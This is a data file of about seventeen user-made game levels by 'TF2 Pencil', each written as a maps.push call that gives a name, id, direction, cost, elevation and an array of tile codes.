maps.push({name="Need Two Floors 2",author="TF2 Pencil",id="#1662408316",direction="forward",cost=261,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,125,0,0,52,52,52,52,52,52,112,96,96,112,112,52,52,52,52,52,52,52,0,0,52,52,52,52,52,52,112,96,96,112,112,52,52,52,52,52,52,52,0,0,52,52,1,1,1,38,1,1,1,1,1,38,38,1,1,1,1,1,0,0,52,52,112,99,1,38,38,38,38,38,38,38,97,1,0,0,0,0,0,0,52,52,112,131,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,38,38,1,1,1,52,52,52,52,52,52,52,52,52,52,52,52,52,0,0,38,38,98,98,38,52,52,52,52,52,52,52,52,52,52,52,52,52,0,0,38,38,98,98,38,12,132,12,0,0,0,0,0,1,112,112,52,52,0,0,0,0,0,0,0,12,12,12,0,0,0,0,0,1,102,112,52,52,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,52,52,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,101,38,52,52,0,0,38,0,38,0,38,0,38,0,38,0,38,0,38,1,1,1,112,112,0,0,38,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,12,12,0,0,38,38,0,12,12,12,12,12,12,103,103,103,12,12,12,12,12,12,0,0,104,38,0,12,12,12,12,12,12,103,103,103,12,12,12,12,12,12,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Cave Mines",author="TF2 Pencil",id="#1662408445",direction="left",cost=324,elevation=-19,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,124,124,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,1,91,91,1,94,93,91,119,119,118,117,116,115,114,114,114,114,1,0,0,1,91,91,1,94,93,91,119,119,118,117,116,115,114,114,114,114,1,0,0,1,91,91,1,1,1,1,91,91,1,1,1,1,1,91,91,91,1,0,0,1,124,124,123,122,121,120,119,119,1,93,94,114,91,114,114,114,1,0,0,1,124,124,123,122,121,120,119,119,1,93,94,114,91,114,114,114,1,0,0,1,1,1,1,1,1,1,1,1,1,91,91,91,91,91,91,91,1,0,0,1,1,114,114,114,91,114,114,114,91,114,114,114,91,114,114,114,1,0,0,1,1,114,114,114,91,114,114,114,91,114,114,114,91,114,114,114,1,0,0,1,1,114,114,114,91,114,114,114,91,114,114,114,91,91,91,91,1,0,0,1,1,100,114,114,91,100,114,114,91,100,114,114,91,114,114,114,1,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,95,95,1,0,2,5,5,105,105,105,105,105,106,107,108,109,110,111,112,113,114,114,1,0,2,5,5,105,105,105,105,105,106,107,108,109,110,111,112,113,114,114,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0]});
maps.push({name="How to get up",author="TF2 Pencil",id="#1662408472",direction="forward",cost=259,elevation=11,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,22,22,0,11,11,0,0,1,132,7,7,7,7,7,7,7,7,7,7,92,22,22,0,11,11,0,0,1,7,7,7,7,7,7,7,7,7,7,7,92,22,22,0,11,11,11,0,1,7,1,1,1,1,1,1,1,1,1,1,1,22,22,0,11,131,11,0,1,132,7,7,7,7,7,7,7,7,7,7,3,22,22,0,11,11,11,0,1,7,7,7,7,7,7,7,7,7,7,7,3,22,96,0,0,0,0,0,1,7,1,1,1,1,1,1,1,1,1,1,1,96,96,0,0,0,0,0,1,132,7,7,7,7,7,10,125,14,14,18,125,22,22,0,0,0,0,0,1,7,7,7,7,7,125,10,10,14,125,18,18,22,22,0,0,0,0,0,1,7,1,1,1,1,1,1,1,1,1,1,1,22,22,0,0,0,0,0,1,132,7,7,7,7,7,7,7,7,7,7,4,22,22,0,0,0,0,0,1,7,7,7,7,7,7,7,7,7,7,7,4,22,22,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,97,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Open Bridge",author="TF2 Pencil",id="#1662412164",direction="forward",cost=149,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,97,34,0,34,0,14,14,14,14,0,0,0,0,0,0,0,0,34,34,0,34,34,0,34,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,34,0,0,0,0,0,0,0,96,96,96,96,0,0,0,0,0,0,0,0,34,0,0,0,0,0,0,0,96,96,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,34,0,34,99,0,0,0,0,98,98,98,98,0,0,0,0,0,0,0,0,34,0,34,34,0,0,0,0,98,98,98,98,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,34,0,0,0,0,0,0,0,101,101,101,101,0,0,0,0,0,0,0,0,34,0,0,0,0,0,0,0,101,101,101,101,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,34,34,0,0,34,102,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0]});
maps.push({name="Teleport Cage",author="TF2 Pencil",id="#1662412202",direction="forward",cost=227,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,13,13,0,0,0,0,0,0,0,1,132,13,96,13,96,13,132,1,0,0,13,13,0,0,0,0,0,0,0,1,13,13,96,13,96,13,13,1,0,0,13,13,0,0,0,0,0,0,0,1,1,1,1,13,1,1,1,1,0,0,13,13,0,0,0,0,0,0,0,1,132,13,96,13,96,13,132,1,0,0,13,13,0,0,0,0,0,0,0,1,13,13,96,13,96,13,13,1,0,0,13,13,0,0,0,0,0,0,0,1,1,1,1,13,1,1,1,1,0,0,13,13,0,0,0,0,0,0,0,1,132,13,96,13,96,13,132,1,0,0,13,13,0,0,0,0,0,0,0,1,13,13,96,13,96,13,13,1,0,13,13,13,13,13,0,0,0,0,0,1,1,1,1,13,1,1,1,1,0,13,13,13,131,13,0,0,0,0,0,1,132,13,96,13,96,13,132,1,0,13,13,13,13,13,0,0,0,0,0,1,13,13,96,13,96,13,13,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,13,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,33,33,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,0,0,35,35,0,37,0,0,37,0,0,37,0,0,37,37,13,13,13,13,0,0,37,37,0,37,0,0,37,0,0,37,0,0,37,97,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="34outh45987g543bgtry",author="TF2 Pencil",id="#1662412259",direction="right",cost=116,elevation=-19,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,24,24,1,11,11,10,9,8,7,6,5,5,0,0,25,25,0,0,0,0,24,24,1,12,12,10,9,8,7,6,5,5,0,0,25,25,0,0,0,0,24,24,1,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,1,14,14,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,23,23,1,15,15,0,0,0,0,0,25,25,0,0,0,5,5,0,0,0,22,22,1,16,16,0,0,0,0,0,0,0,0,0,0,5,5,2,0,0,21,21,1,17,17,0,0,0,0,0,25,25,0,0,0,5,5,2,0,0,20,20,1,18,18,0,0,0,0,0,25,25,0,0,0,5,5,0,0,0,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,0,0,0,0,0,25,25,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Jump Around 2",author="TF2 Pencil",id="#1662412298",direction="right",cost=489,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0,16,16,0,0,0,0,0,0,0,1,16,132,16,16,16,16,1,0,0,1,127,127,1,1,1,1,1,1,1,1,1,1,1,1,1,16,16,0,0,1,127,127,1,16,16,128,128,128,128,128,128,128,16,16,1,16,16,0,0,1,127,127,1,16,16,128,128,128,128,128,128,128,16,16,1,16,16,0,0,1,127,127,1,127,127,1,1,1,1,1,1,1,126,126,1,16,16,0,0,1,127,127,1,127,127,1,16,16,16,16,16,1,126,126,1,16,16,0,0,1,127,127,1,127,127,1,16,16,16,16,16,1,126,126,1,16,16,0,0,1,127,127,1,127,127,1,16,16,1,126,126,1,126,126,1,16,16,2,0,1,127,127,1,127,127,1,131,16,1,126,126,1,126,126,1,16,16,2,0,1,127,127,1,127,127,1,1,1,1,126,126,1,126,126,1,0,0,0,0,1,127,127,1,16,16,129,129,129,129,16,16,1,126,126,1,0,0,0,0,1,127,127,1,16,16,129,129,129,129,16,16,1,126,126,1,0,0,0,0,1,127,127,1,1,1,1,1,1,1,1,1,1,126,126,1,0,0,0,0,1,16,16,129,129,129,129,129,129,129,129,129,129,16,16,1,0,0,0,0,1,16,16,129,129,129,129,129,129,129,129,129,129,16,16,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="23qniuwr92h3rn b9e8r",author="TF2 Pencil",id="#1662449465",direction="right",cost=58,elevation=14,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,22,22,0,22,0,22,0,22,0,0,0,0,10,10,0,0,0,0,0,0,22,22,0,22,0,22,0,22,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,22,22,0,0,0,0,0,22,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,22,0,0,0,0,14,14,16,16,18,18,20,20,22,22,0,0,22,0,0,22,2,0,0,0,14,14,16,16,18,18,20,20,22,22,0,0,22,0,0,22,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Jump in",author="TF2 Pencil",id="#1662449511",direction="forward",cost=154,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,11,11,11,11,11,11,11,0,0,0,0,0,0,0,11,11,0,0,0,0,11,66,66,66,66,66,11,0,0,0,0,0,0,0,11,11,0,0,0,0,11,66,66,66,66,66,11,0,0,0,0,0,0,0,11,11,0,0,0,0,11,66,66,66,66,66,11,0,0,0,0,0,0,0,11,11,0,0,0,0,11,66,66,66,66,66,11,0,0,0,128,11,11,11,11,11,0,0,0,0,11,66,66,66,66,66,11,0,0,0,128,11,11,11,11,11,0,0,0,0,11,66,66,66,66,66,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,66,66,66,66,66,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,66,66,66,66,66,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="u34bfu2ifberogbegeob",author="TF2 Pencil",id="#1662449574",direction="left",cost=162,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,2,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,2,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,19,19,0,0,39,0,0,19,19,0,0,39,39,0,0,19,19,0,0,0,19,19,0,0,39,0,0,19,19,0,0,39,39,0,0,19,19,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,19,19,135,135,135,135,135,19,19,135,135,135,135,135,135,19,19,0,0,0,19,19,135,135,135,135,135,19,19,135,135,135,135,135,135,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Jump Around 3",author="TF2 Pencil",id="#1662449615",direction="left",cost=204,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,8,8,0,2,8,8,8,0,0,1,8,8,8,8,8,8,8,1,0,0,8,8,0,2,8,8,8,0,0,1,8,8,8,8,8,8,8,1,0,0,8,8,0,0,0,8,8,0,0,1,8,8,1,1,1,8,8,1,0,0,8,8,0,0,0,8,8,0,0,1,8,8,1,0,1,8,8,1,0,0,8,8,0,0,0,8,8,0,0,1,127,127,1,0,1,8,8,1,0,0,127,127,0,0,0,0,0,0,0,1,0,0,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,1,0,0,1,0,0,0,0,0,0,1,126,126,1,0,1,8,8,1,0,1,126,126,1,0,1,8,8,1,0,1,8,8,1,1,1,8,8,1,0,1,8,8,1,1,1,8,8,1,0,1,8,8,8,8,8,8,8,1,0,1,8,8,8,8,8,8,8,1,0,1,8,8,8,8,8,8,8,1,0,1,8,8,8,8,8,8,8,1,0,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="2 Floors and 2 Sides",author="TF2 Pencil",id="#1662449659",direction="forward",cost=132,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,0,0,0,0,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,0,0,0,0,57,57,0,0,0,0,0,125,17,0,0,0,0,0,57,57,0,0,0,0,57,57,0,0,0,0,0,17,17,0,0,0,0,0,57,57,0,0,0,0,57,57,0,0,0,0,0,0,0,0,0,0,0,0,57,57,0,0,0,0,57,57,0,0,0,0,0,0,0,0,0,0,0,0,57,57,0,0,0,0,57,57,0,0,0,0,0,0,0,0,0,0,0,0,57,57,0,0,0,0,57,57,0,0,0,0,0,0,0,0,0,0,0,0,57,57,0,0,0,0,57,57,0,0,0,0,0,0,0,0,0,0,0,0,57,57,0,0,0,0,57,57,0,0,0,0,0,0,0,0,0,0,0,0,57,57,0,0,0,0,57,57,42,100,0,0,0,0,0,0,0,0,100,117,57,57,0,0,0,0,57,57,42,42,0,0,0,0,0,0,0,0,117,117,57,57,0,0,0,0,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,0,0,0,0,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Need Two Floors 3",author="TF2 Pencil",id="#1662449701",direction="forward",cost=235,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,14,14,14,0,0,0,0,0,0,0,40,100,0,0,0,14,14,0,0,0,14,97,14,0,0,0,0,0,0,0,40,40,0,0,0,14,125,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,0,0,0,14,14,54,54,54,54,54,54,54,54,54,54,54,54,54,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,99,114,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,54,54,0,0,0,0,0,0,0,0,0,100,40,98,0,96,40,0,40,40,54,54,0,0,0,100,40,3,3,3,3,40,40,98,0,96,40,0,40,40,54,54,0,0,0,40,40,1,1,1,1,1,1,1,1,1,1,1,1,1,54,54,0,0,0,54,54,114,114,114,114,114,114,114,114,114,114,114,114,114,54,54,0,0,0,54,54,114,114,114,114,114,114,114,114,114,114,114,114,114,54,54,0,0,0,54,54,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,40,100,0,0,0,0,0,0,0,0,0,0,0,40,40,0,0,0,54,54,0,0,0,0,0,0,0,0,0,0,34,104,34,0,0,0,0,0,14,14,114,114,114,114,114,114,114,14,14,114,114,114,114,54,54,0,0,0,14,14,114,114,114,114,114,114,114,14,14,114,114,114,114,54,54,0,0,0,14,14,0,0,0,0,0,0,0,40,40,1,1,1,1,1,40,0,0,0,2,2,0,0,0,0,0,0,0,100,40,40,103,103,40,40,40,0,0]});
maps.push({name="348grf3uyfbv87vbvier",author="TF2 Pencil",id="#1662449761",direction="left",cost=127,elevation=12,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,7,7,0,0,2,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,8,8,0,0,2,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,13,13,0,0,0,0,0,0,126,126,0,0,0,0,135,135,0,0,0,0,14,14,0,0,0,0,0,0,19,19,0,0,0,0,135,135,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,16,16,0,0,0,0,0,0,39,39,0,0,0,0,135,135,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,18,18,0,0,0,0,0,0,19,19,0,39,39,0,19,19,19,19,19,19,19,19,0,0,0,0,0,0,100,19,0,39,39,0,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Is this stupid",author="TF2 Pencil",id="#1662449841",direction="right",cost=74,elevation=-12,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,100,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,39,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,135,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,135,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,135,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,39,0,0,0,0,0,0,0,0,0,125,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,62,62,61,60,59,58,57,56,55,54,53,52,51,50,10,10,2,0,0,0,62,62,61,60,59,58,57,56,55,54,53,52,51,50,10,10,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Jump or go jail",author="TF2 Pencil",id="#1662449897",direction="forward",cost=240,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,12,12,12,7,12,7,12,12,0,0,0,0,0,12,12,0,0,0,0,0,12,12,12,7,12,7,12,12,7,7,131,7,7,12,12,0,0,0,0,0,7,7,7,131,7,7,12,12,7,0,0,0,7,12,12,0,0,0,0,0,12,12,0,0,0,0,12,12,7,12,12,12,7,12,12,0,0,0,0,0,7,7,7,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,12,12,7,0,0,0,1,132,12,12,1,12,12,132,1,0,0,0,0,0,7,7,131,0,0,0,1,12,12,12,1,12,12,12,1,0,0,0,0,0,12,12,7,0,12,97,1,12,12,12,1,12,12,12,1,0,0,0,0,0,7,7,7,0,12,12,1,96,96,96,1,96,96,96,1,0,0,0,0,0,12,12,7,12,12,12,12,12,12,12,12,12,12,12,1,0,0,0,0,0,12,12,7,12,12,12,12,12,12,12,12,12,12,12,1,0,0,0,0,0,0,0,0,0,12,12,1,96,96,96,1,96,96,96,1,0,0,0,0,0,0,0,0,0,12,12,1,12,12,12,1,12,12,12,1,0,0,0,0,0,0,0,0,0,12,12,1,12,12,12,1,12,12,12,1,0,0,0,0,0,0,0,0,0,12,12,1,132,12,12,1,12,12,132,1,0,0,0,0,0,0,0,0,0,12,12,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="whatever this is",author="TF2 Pencil",id="#1662449989",direction="left",cost=129,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,40,40,18,100,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,40,40,18,18,0,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,40,40,0,0,0,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,42,42,0,0,0,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,40,40,0,0,0,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,40,40,18,18,135,135,135,135,135,18,18,18,0,0,0,0,0,0,0,0,40,40,18,18,135,135,135,135,135,18,18,18,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,0,2,18,18,18,135,135,135,135,135,18,18,0,0,0,0,0,0,0,0,0,2,18,18,18,135,135,135,135,135,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
